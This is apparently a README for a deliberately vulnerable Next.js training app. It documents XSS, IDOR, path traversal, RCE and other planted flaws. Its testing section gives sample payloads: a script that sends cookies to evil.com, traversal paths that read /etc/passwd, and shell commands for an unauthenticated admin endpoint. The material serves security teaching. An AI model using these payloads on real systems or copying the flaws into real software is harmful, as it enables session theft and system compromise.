# TaskMaster Pro - Intentionally Vulnerable Productivity App

⚠️ **WARNING: This application contains INTENTIONAL security vulnerabilities for educational purposes. DO NOT deploy to production or any public environment!**

## Overview

TaskMaster Pro is a Next.js productivity application that demonstrates common security vulnerabilities often found in AI-generated code. This app serves as an educational tool to understand what NOT to do when building web applications.

## Getting Started

```bash
npm install
npm run dev
```

Visit `http://localhost:3000` to access the application.

## Demo Credentials

- **Admin**: username: `admin`, password: `password`
- **User**: username: `user`, password: `123456`
- **Guest**: username: `guest`, password: `guest`

## Intentional Security Vulnerabilities

### 1. **Cross-Site Scripting (XSS)**
- **Location**: Task titles, descriptions, comments, search functionality
- **Example**: Try creating a task with title: `<script>alert('XSS')</script>`
- **Impact**: Can steal user sessions, redirect users, modify page content

### 2. **Insecure Session Management**
- **Issues**:
  - Weak, predictable token generation
  - Tokens stored in localStorage (not httpOnly cookies)
  - No token expiration or rotation
  - Session data exposed in client-side code
- **Location**: `/api/auth/login`, client-side storage
- **Impact**: Session hijacking, token prediction attacks

### 3. **Insecure Direct Object References (IDOR)**
- **Location**: `/profile` page, `/api/auth/user/[id]`
- **Example**: Change User ID to access any user's profile data
- **Impact**: Unauthorized access to sensitive user information including SSNs

### 4. **Path Traversal & Unrestricted File Upload**
- **Location**: `/upload` page, `/api/upload`, `/api/files/*`
- **Examples**:
  - Upload path: `../../../etc/passwd`
  - Filename: `../../../app/layout.tsx`
- **Impact**: Read/write arbitrary files, potential remote code execution

### 5. **Remote Code Execution (RCE)**
- **Location**: `/admin` page, `/api/admin/execute`
- **Example**: Execute system commands like `whoami`, `ls`, `cat /etc/passwd`
- **Impact**: Complete system compromise

### 6. **Missing Authentication & Authorization**
- **Issues**:
  - Admin panel accessible without proper role checking
  - API endpoints without authentication
  - No rate limiting or brute force protection
- **Impact**: Unauthorized access to administrative functions

### 7. **Information Disclosure**
- **Issues**:
  - Hardcoded API keys in frontend code
  - Detailed error messages exposing system information
  - Debug information in production
  - Sensitive data in API responses
- **Locations**: Page source, API error responses, logs

### 8. **Missing Security Headers**
- **Issues**:
  - No Content Security Policy (CSP)
  - No X-Frame-Options
  - No security headers in responses
- **Impact**: Clickjacking, XSS attacks

### 9. **Insecure File Operations**
- **Issues**:
  - File deletion via GET requests
  - No file type restrictions
  - Arbitrary file system access
- **Location**: File management functionality

### 10. **SQL Injection Potential**
- While this demo doesn't use a real database, the code patterns show vulnerability to SQL injection in database queries

## Educational Testing Scenarios

### XSS Testing
1. Create a task with title: `<img src=x onerror=alert('XSS')>`
2. Add a comment with: `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`
3. Search for: `<svg onload=alert('Search XSS')>`

### IDOR Testing
1. Log in as any user
2. Go to Profile page
3. Change the User ID field to access other users' data (try IDs 1-5)

### Path Traversal Testing
1. Upload a file with path: `../../../etc/passwd`
2. Try to download: `/api/files/download?file=../../../etc/passwd`
3. Upload with filename: `../../../malicious.php`

### RCE Testing (Admin Panel)
1. Access `/admin` (no real authentication required)
2. Execute commands:
   - `whoami` (current user)
   - `ls -la` (list files)
   - `cat /etc/passwd` (system users)
   - `ps aux` (running processes)

## File Structure

```
app/
├── layout.tsx                 # Hardcoded secrets, missing security headers
├── page.tsx                   # XSS in error messages, insecure session
├── tasks/page.tsx             # XSS vulnerabilities
├── upload/page.tsx            # Path traversal interface
├── profile/page.tsx           # IDOR vulnerabilities
├── admin/page.tsx             # Unauthorized access, RCE interface
└── api/
    ├── auth/
    │   ├── login/route.ts     # Insecure authentication
    │   └── user/[id]/route.ts # IDOR, information disclosure
    ├── tasks/                 # XSS, missing authentication
    ├── upload/route.ts        # Path traversal, unrestricted upload  
    ├── files/                 # Arbitrary file access
    └── admin/                 # RCE, information disclosure
```

## What NOT to Do (Lessons Learned)

1. **Never store sensitive data in localStorage**
2. **Always sanitize user input before rendering**
3. **Implement proper authentication and authorization**
4. **Validate and sanitize file uploads**
5. **Never execute user input as system commands**
6. **Use security headers and CSP**
7. **Don't expose detailed error messages**
8. **Implement rate limiting and input validation**
9. **Follow the principle of least privilege**
10. **Never hardcode secrets in client-side code**

## Disclaimer

This application is created solely for educational purposes to demonstrate common security vulnerabilities. It should never be deployed in a production environment or made accessible over the internet. The vulnerabilities are intentionally obvious and well-documented to aid in learning about web application security.

## Security Best Practices

For building secure applications, consider:
- Using established authentication libraries
- Implementing proper input validation and sanitization
- Following OWASP security guidelines
- Regular security audits and penetration testing
- Keeping dependencies updated
- Using security headers and CSP
- Implementing proper logging and monitoring

---

**Remember: With great power comes great responsibility. Use this knowledge to build more secure applications! 🔒**